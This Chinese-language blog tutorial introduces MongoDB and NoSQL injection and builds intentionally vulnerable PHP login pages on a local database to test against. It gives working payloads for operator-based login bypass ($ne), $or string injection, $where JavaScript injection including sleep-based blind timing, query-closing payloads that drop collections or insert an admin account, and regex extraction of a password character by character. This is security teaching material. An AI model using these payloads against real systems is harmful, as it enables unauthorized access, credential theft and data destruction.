# MONGODB 的基础 NOSQL注入基础

首先来学习一下nosql

这里安装就不进行介绍 只记录一下让自己了解mongodb

```cobol
ubuntu 安装后 进入 /usr/bin  
 
./mongodb
 
即可进入
 
然后可通过 进入的url链接数据库
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/98ca88304bf1fdc62eeba0b933e890af.png" alt="" style="max-height:418px; box-sizing:content-box;" />


## 基本操作

```cobol
show db
 
show dbs
 
show tables
 
use  数据库名
 
插入数据
 
db.admin.insert({json格式的数据})
 
例如 
 
db.admin.insert({'id':1,'name':admin,'passwd':admin123})
 
或者通过定义的方法
 
canshu={'id':1,'name':admin,'passwd':admin123}
 
db.admin.insert(canshu)
 
删除
 
db.admin.remove()
 
更新
 
db.admin.update({'name':'admin'},{$set{'id':1}})
 
前面是条件 后面是更新的内容
```

然后我们现在需要来查看 nosql的符号

## 条件操作符

```puppet
$gt : >
$lt : <
$gte: >=
$lte: <=
$ne : !=、<>
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/
 
解释
 
$gt	大于
$lte	小于等于
$in	包含
$nin	不包含
$lt	小于
$gte	大于等于
$ne	不等于
$eq	等于
$and	与
$nor	$nor在NOR一个或多个查询表达式的数组上执行逻辑运算，并选择 对该数组中所有查询表达式都失败的文档
$not	反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在
$or
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fe13874fce78ee2f9df3b58ce5394383.png" alt="" style="max-height:292px; box-sizing:content-box;" />


知道这五个其实就OK了

## SQL注入

因为这里传入的都是json格式的文件

所以首先我们来搭建一个查询网站

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb"); //修改url
$username = $_POST['username'];  //修改集合字段
$password = $_POST['password'];
 
$query = new MongoDB\Driver\Query(['name' => $username, 'password' => $password]);
$result = $manager->executeQuery('test.admin', $query)->toArray();
 
$count = count($result);
$queryString = json_encode($result);
echo '查询结果: ' . $queryString . '<br>';
 
if ($count > 0) {
    foreach ($result as $user) {
        $user = (array)$user;
        echo $user;
        echo '====Login Success====<br>';
        echo 'username: ' . $user['name'] . '<br>';  //修改集合字段
        echo 'password: ' . $user['password'] . '<br>';
    }
} else {
    echo 'Login Failed';
}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ab326a22680b6b2d78c467e70c5922f5.png" alt="" style="max-height:665px; box-sizing:content-box;" />


测试后是ok的 那么这里我们如何注入呢

我们首先要知道传入的语句是什么呢

```cobol
'name' => $username, 'password' => $password
```

其实是这个

我们构思一下 如果我们传入一个

### 永真注入

```cobol
username[$ne]=1&password[$ne]=1
 
[$ne] 为 ！= 
 
 
那么这里传入的语句是什么呢
 
 
'name' => array('$ne'=> 1), 'password' => array('$ne'=>1)
 
mongodb 的查询语句 就变为了 
 
db.admin.find({'username':{$ne:1}, 'password':{$ne:1}})
 
只要username和password !=0 就都查询出来  
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0851b92c775539df5ba77258d701baaf.png" alt="" style="max-height:122px; box-sizing:content-box;" />


这里其实是PHP特性导致的

```cobol
value = 1 
 
传入的参数就是 1
 
value[$ne]
 
传入的参数就是 array([$ne]=>1)
```

### 联合注入  （过时）

这里其实也是设计者的错误

我们将 查询语句

```cobol
name => $username,password => $passwd
 
修改为
 
"{ username: '" + $username + "', password: '" + $password + "' }"
 
变成拼接模式
 
```

当我们正常输入的时候

```cobol
{username : admin,password: admin123}
 
查询语句就是
 
db.admin.find({username : 'admin',password: 'admin123'})
 
但是我们如果不正常查询呢
 
我们传入
username = admin', $or: [ {}, {'a': 'a
password = ' }]

最后获取到的数据是什么呢


db.admin.find({ name: 'admin', $or: [ {}, {'a':'a', password: '' }]})

```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c03c568899c605becdb95c936ccd5522.png" alt="" style="max-height:131px; box-sizing:content-box;" />


实现了查询注入

但是这个方法现在可能都无法使用 ，现在的开发都必须要传入一个数组或者Qurey对象

### JavaScript注入

mongodb支持JavaScript的脚本辅助

这里要提及mongodb的关键词 $where

#### $where关键词

在MONGODB中 支持使用 $where关键词进行javascrip执行

```scss
db.admin.find({ $where: "function(){return(this.name == 'admin')}" })
```

这是一个简单的利用 执行函数返回用户名的数据



<img src="https://i-blog.csdnimg.cn/blog_migrate/f31af6b55e563d8b319425262b3845f9.png" alt="" style="max-height:53px; box-sizing:content-box;" />


但是在例如直接传参的时候 就会造成注入

```scss
 
db.admin.find({ $where: "function(){return(this.name == $userData" })
 
 
db.admin.find({ $where: "function(){return(this.name =='a'; sleep(5000))}" })
```

这里就可以查询到不该查询的内容 和 盲注

我们也测试一下

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb");
$username = $_POST['username'];
$password = $_POST['password'];
$function = "function() {
    var name = '".$username."';
    var password = '".$password."';
    if(name == 'admin' && password == 'admin123'){
        return true;
    }else{
        return false;
    }
}";
 
$query = new MongoDB\Driver\Query(['$where' => $function]);
$result = $manager->executeQuery('test.admin', $query)->toArray();
$count = count($result);
if ($count > 0) {
    foreach ($result as $user) {
        $user = (array)$user;
        echo '====Login Success====<br>';
        echo 'username: '.$user['name']."<br>";
        echo 'password: '.$user['password']."<br>";
    }
} else {
    echo 'Login Failed';
}
?>
```

我们正常传输入

java脚本是

```cobol
function() {
    var name = 'admin';
    var password = 'admin123';
    if(name == 'admin' && password == 'admin123'){
        return true;
    }else{
        return false;
    }
}
 
 
然后进入数据库
 
db.admin.find({$where:function() {
    var name = 'admin';
    var password = 'admin123';
    if(name == 'admin' && password == 'admin123'){
        return true;
    }else{
        return false;
    }
  }
})
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d75a615f1a9e781f18ed46a796ad5345.png" alt="" style="max-height:411px; box-sizing:content-box;" />
那么这里我们使用注入呢

我们构造万能钥匙

```cobol
username=1&password=1';return true;var a='1
username=1&password=1';return true//
进入javascrip为

$function = "function() {
    var name = '1';
    var password = '1';return true;var a='1';
    if(name == 'admin' && password == 'admin123'){
        return true;
    }else{
        return false;
    }
}";

美化后
$function = "function() {
    var name = '1';
    var password = '1';
    return true;
    var a='1';
    if(name == 'admin' && password == 'admin123'){
        return true;
    }else{
        return false;
    }
}";

这里可以发现 直接return ture 所以绕过了下面的判断
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f7d421d30b6fc87e7979e475af5fe704.png" alt="" style="max-height:650px; box-sizing:content-box;" />


### comment方法造成注入

这里的内容其实是被php官方制止的 因为很容易造成漏洞

但是如果工作量很大 难免有人选择

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb");
$username = $_POST['username'];
 
$filter = ['name' => $username];
$query = new MongoDB\Driver\Query($filter);
 
$result = $manager->executeQuery('test.admin', $query)->toArray();
$count = count($result);
 
if ($count > 0) {
    foreach ($result as $user) {
        $user = (array)$user;
        echo '====Login Success====<br>';
        echo 'username: ' . $user['name'] . '<br>';
        echo 'password: ' . $user['password'] . '<br>';
    }
} else {
    echo 'Login Failed';
}
?>
```

这个时候 其实我们就已经是shell的权限了 我们可以开始操作数据库

但是本地是最新的mongodb

所以出现报错

```cobol
 
Fatal error: Uncaught MongoDB\Driver\Exception\CommandException: no such command: 'eval' in C:\Users\Administrator\Desktop\CTFcode\dir.php:9 Stack trace: #0 C:\Users\Administrator\Desktop\CTFcode\dir.php(9): MongoDB\Driver\Manager->executeCommand('admin', Object(MongoDB\Driver\Command)) #1 {main} thrown in C:\Users\Administrator\Desktop\CTFcode\dir.php on line 9
```

但是我们看payload其实就ok了

```cobol
username=1'});db.users.drop();db.user.find({'username':'1
username=1'});db.users.insert({"username":"admin","password":123456"});db.users.find({'username':'1
```

我们发现其实就是通过闭合 然后就可以执行命令了

### 布尔注入

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb");
$username = $_POST['username'];
$password = $_POST['password'];
 
$query = new MongoDB\Driver\Query([
    'name' => $username,
    'password' => $password
]);
 
$result = $manager->executeQuery('test.admin', $query)->toArray();
$count = count($result);
 
if ($count > 0) {
    foreach ($result as $user) {
        $user = (array)$user;
        echo '==== Login Success ====<br>';
        echo 'Username: ' . $user['name'] . '<br>';
        echo 'Password: ' . $user['password'] . '<br>';
    }
} else {
    echo 'Login Failed';
}
?>
```

首先我们在已知账号的情况下可以

```cobol
password[$regex]=.{6}
```

通过正则匹配来获取

具体传入内容是

```php
{
    'name':'admin',
    'password':array([$regex]=>'.{6}')
 
}
 
这里是匹配任意6个字符
 
进入数据库后是 
 
db.admin.find({'name':'admin','password':{$regex:'.{6}'}})
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ac949d5b827ecc66990d3694cd42afd0.png" alt="" style="max-height:123px; box-sizing:content-box;" />


发现实现了访问



<img src="https://i-blog.csdnimg.cn/blog_migrate/814a5e5488467597ee55a061cbd45eaf.png" alt="" style="max-height:176px; box-sizing:content-box;" />


发现超过了就没有回显了 所以这里可以拿来测试密码长度

我们要获取数字 其实就可以通过正则表达式来

```php
db.admin.find({'name':'admin','password':{$regex:'^a'}})
 
db.admin.find({'name':'admin','password':{$regex:'^ad'}})
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/25c4c8cd06a8dddd1d66b0279cea5316.png" alt="" style="max-height:111px; box-sizing:content-box;" />


这里 基本的nosql注入 就实现了